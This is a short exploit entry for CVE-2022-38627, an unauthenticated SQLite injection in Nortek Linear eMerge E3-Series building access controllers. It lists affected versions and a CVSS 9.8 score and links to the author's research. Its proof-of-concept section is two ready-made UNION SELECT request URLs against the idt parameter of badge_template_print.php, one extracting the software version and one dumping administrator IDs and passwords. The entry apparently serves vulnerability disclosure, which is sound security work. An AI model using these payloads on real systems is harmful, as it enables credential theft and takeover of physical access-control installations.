# Exploit Title: Nortek Linear eMerge E3-Series - SQLite Injection
# Exploit Author: Omar Hashim
# Versions: 0.32-08f, 0.32-07p, 0.32-07e, 0.32-09c, 0.32-09b, 0.32-09a, 0.32-08e
# Vendor home page: https://na.niceforyou.com/brands/linear/
# Vendor home page: https://www.nortekcontrol.com/access-control/
# Vendor home page: https://linear-solutions.com/
# Authentication Required: No
# CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
# CVSS v3.1 Score: 9.8 CRITICAL
# CVE : CVE-2022-38627

# Description
 ====================
Linear eMerge E3-Series 0.32-08f, 0.32-07p, 0.32-07e, 0.32-09c,0.32-09b, 0.32-09a, and 0.32-08e were discovered to contain a SQL
 injection vulnerability via the idt parameter.


#Proof Of Concept:
 ====================
# Research:
 https://omar0x01.medium.com/cve-2022-38627-a-journey-through-sqlite-injection-to-compromise-the-whole-enterprise-building-15cebd072ed6
 
# Exploit the SQLite Injection to Extract the Software Version from the database
http://<HOST:PORT>/badging/badge_template_print.php?tpl=aa.xml&idt=1337 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,' SWVersion:'||SWVersion,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from version
# Exploit the SQLite Injection to Extract the Admin Credentials from the database
http://<HOST:PORT>/badging/badge_template_print.php?tpl=aa.xml&idt=1337 union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,' Admin-ID-is:'||id||'%20Admin-Password-is:'||password,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from controller
